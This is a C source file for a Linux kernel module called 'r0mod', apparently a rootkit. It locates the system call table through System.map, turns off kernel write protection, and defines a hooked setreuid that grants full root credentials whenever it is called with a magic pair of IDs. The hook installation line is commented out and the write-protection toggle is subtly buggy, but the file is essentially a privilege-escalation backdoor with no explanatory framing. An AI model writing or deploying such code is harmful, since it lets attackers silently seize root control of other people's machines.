#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <linux/version.h>

#include <r0mod/global.h>

#define MAX_LEN     256
#define PROC_V      "/proc/version"
#define BOOT_PATH   "/boot/System.map-"

int sys_found = 0;
unsigned long *syscall_table;

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);

asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    if((ruid == 1000) && (euid == 100))
    {
        printk(KERN_ALERT "[Correct]\n");

#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,29)
        current->uid = current->gid = 0;
        current->euid = current->egid = 0;
        current->suid = current->sgid = 0;
        current->fsuid = current->fsgid = 0;
#else
        commit_creds(0);
#endif

        return orig_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}

char *search_file(char *buf)
{
    char *ver;

    struct file *f;

    mm_segment_t oldfs;

    oldfs = get_fs();
    set_fs(KERNEL_DS);

    f = filp_open(PROC_V, O_RDONLY, 0);
    if(IS_ERR(f) || (f == NULL))
        return NULL;

    memset(buf, 0, MAX_LEN);

    vfs_read(f, buf, MAX_LEN, &f->f_pos);

    ver = strsep((char**)&buf, " ");
    ver = strsep((char**)&buf, " ");
    ver = strsep((char**)&buf, " ");

    filp_close(f, 0);
    set_fs(oldfs);

    return ver;
}

static int find_sys_call_table(char *kern_ver)
{
    int i = 0;
    char buf[MAX_LEN];
    char *p, *filename;

    struct file *f = NULL;

    mm_segment_t oldfs;

    oldfs = get_fs();
    set_fs(KERNEL_DS);

    filename = kmalloc(strlen(kern_ver) + strlen(BOOT_PATH) + 1, GFP_KERNEL);
    if(filename == NULL)
        return -1;

    memset(filename, 0, strlen(BOOT_PATH) + strlen(kern_ver) + 1);
    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
    strncat(filename, kern_ver, strlen(kern_ver));
    printk(KERN_ALERT "Path: %s", filename);

    f = filp_open(filename, O_RDONLY, 0);
    if(IS_ERR(f) || (f == NULL))
        return -1;

    memset(buf, 0, MAX_LEN);
    p = buf;
    while(vfs_read(f, p + i, 1, &f->f_pos) == 1)
    {
        if(p[i] == '\n' || i == 255)
        {
            i = 0;
            if((strstr(p, "sys_call_table")) != NULL)
            {
                char *sys_string = kmalloc(MAX_LEN, GFP_KERNEL);

                if(sys_string == NULL)
                {
                    filp_close(f, 0);
                    set_fs(oldfs);
                    kfree(filename);

                    return -1;
                }

                memset(sys_string, 0, MAX_LEN);
                strncpy(sys_string, strsep((char**)&p, " "), MAX_LEN);

                syscall_table = (unsigned long *)simple_strtoll(sys_string, NULL, 16);

                kfree(sys_string);

                break;
            }

            memset(buf, 0, MAX_LEN);
            continue;
        }

        i++;
    }

    filp_close(f, 0);
    set_fs(oldfs);

    kfree(filename);

    return 0;
}

static int __init r0mod_init(void)
{
    char *buf, *kern_ver;

    printk("Module starting...");

    buf = kmalloc(MAX_LEN, GFP_KERNEL);
    if(buf == NULL)
    {
        sys_found = 1;
        return -1;
    }

    kern_ver = search_file(buf);
    if(kern_ver == NULL)
    {
        sys_found = 1;
        return -1;
    }

    printk(KERN_ALERT "Kernel version found: %s", kern_ver);

    if(find_sys_call_table(kern_ver) == -1)
    {
        sys_found = 1;
        return -1;
    }

    sys_found = 0;

    write_cr0(read_cr0() && (~0x10000));
    orig_setreuid = syscall_table[__NR_setreuid];
    //syscall_table[__NR_setreuid] = new_setreuid;
    write_cr0(read_cr0() | 0x10000);

    kfree(buf);

    return 0;
}


static void __exit r0mod_exit(void)
{
    printk("Module ending...");

    if(sys_found == 0)
    {
        write_cr0(read_cr0() && (~0x10000));
        syscall_table[__NR_setreuid] = orig_setreuid;
        write_cr0(read_cr0() | 0x10000);
    }
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
